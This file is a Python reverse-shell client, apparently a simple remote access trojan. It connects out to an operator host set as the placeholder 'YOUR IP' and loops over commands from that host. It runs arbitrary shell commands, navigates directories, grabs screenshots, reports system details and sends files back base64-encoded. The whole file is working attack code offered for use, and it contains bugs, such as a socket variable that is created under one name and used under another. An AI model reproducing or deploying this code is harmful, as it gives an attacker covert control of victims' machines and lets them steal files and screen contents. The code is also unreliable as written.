#!/usr/bin/python3

import platform                                 # importing need libs 
from socket import *
from PIL import ImageGrab 
from base64 import b64encode
from subprocess import check_output
from os import chdir, getcwd, getlogin, remove

if __name__ == '__main__':                          # run cods blow only if app got calld by user

    Server  = socket(AF_INET,SOCK_STREAM)   # setting up a TCP connection 
    HOST    = "YOUR IP"                     # our system IP address 
    PORT    = 4556                          # random  port that is not in use
    
    Client.connect((HOST, PORT))            # try to connect to the sever 
    print(f"Connected To {HOST}")           # REMOVE THIS LINE THIS IS JUST FOR DEBUGING 

    while True:                                                     # run while loop
        RawDate    = str(Client.recv(1024), 'utf-8')                # Get Raw date form  server
        Date       = RawDate.split(" ")                             # split raw date to list
        Result     = "404 No Command Found [RUN help]"              # set default  respond   
        MOD        = False                                          # if we went to send bytes with no endcode we gon set this line to true    
    
        print(f"server : {RawDate}")                                # REMOVE THIS LINE 

        if Date[0] == "command":                                    # if user went to enter system command
            try: 
                output = check_output(Date[1], shell="True")        # run the system command 
                Result = str(output, 'utf-8')                       # Update results to command out put
            except: 
                output = "ERROR: Worng command?!"                   # Update results to command with error
                Result = str(output)                                # set output to result 
    
        elif Date[0] == "chdir":                                    # if user went to change dir 
            if Date[1] == "back":                                   # if user went to go back 
                chdir('..')                                         # use os.chdir("..") to go back 
                Result = "[*] Done"                                 # update result 
            elif Date[1] == "path":
                Result = getcwd()                                   # update result with user current path
            elif Date[1] == "chdir":                                # if user went to change the loac 
                chdir(Date[2])                                      # use os.chdir("C:\\Some\whare")
                Result = "[*] Done"                                 # update result
    
        elif Date[0] == "showScreen":                                       # if user went to see screeshot 
            Img  = ImageGrab.grab()                                         # grab screenshot
            Img.save("TMP.png")                                             # save it 
            with open("TMP.png", "rb") as file: output = file.read()        # read the image and save date to var
            remove("TMP.png")                                               # remove the image
            Result = b64encode(bytes(output))                               # convert image date to b64 (fast way to bypass long watting time + less code)
            MOD = True                                                      # make sure we send the date as bytes no encoding 

        elif Date[0] == "sysinfo":                                                                            # if user went to see client system info               
            Result = f"OS: {platform.platform()}\nProcessor: {platform.machine()}\nDomain: {getlogin()}"      # use platform to show system info

        elif Date[0] == "file":                                                                               # if user went file form client
            with open(str(Date[2]), "rb") as File:FileDate = File.read()                                      # read the file and save file date in var
            Result = b64encode(FileDate)                                                                      # convert var to b64
            MOD = True                                                                                        # Make sure we just send bytes  

        elif Date[0] == "quit":quit()                                                                         # if sever went to quit, quit
    
        if MOD == True: Client.send(bytes(Result))                                                            # if mode is True send the date to sever as pure bytes                                                             
        elif MOD == False: Client.send(bytes(Result, 'utf-8'))                                                # if mode is False send the date to sever with utf-8 encoding
    
    Client.close()                                                                                            # Close the tcp connection 